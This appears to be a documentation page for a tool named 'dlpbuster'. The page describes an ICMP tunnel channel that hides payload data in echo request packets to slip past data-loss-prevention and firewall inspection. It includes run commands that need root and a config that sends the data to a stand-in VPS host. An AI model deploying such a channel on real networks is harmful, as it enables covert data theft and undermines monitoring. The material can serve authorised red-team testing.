# ICMP Tunnel Channel

## Overview
Encodes payload in the data field of ICMP echo request packets.

## How It Works
1. Payload is split into 56-byte chunks
2. Each chunk is sent as an ICMP echo request data field
3. Packet index embedded in identifier field for ordering

## Why It Bypasses DLP
ICMP is frequently overlooked by DLP and firewall rules. Many organisations permit ICMP outbound without inspection.

## Requirements
**Root / CAP_NET_RAW required.** Raw sockets need elevated privileges on Linux.

```bash
sudo dlpbuster run --channel icmp
# or
sudo setcap cap_net_raw+ep ./bin/dlpbuster
```

## Configuration
```yaml
channels:
  icmp:
    enabled: true
    target: "your-vps.example.com"
```
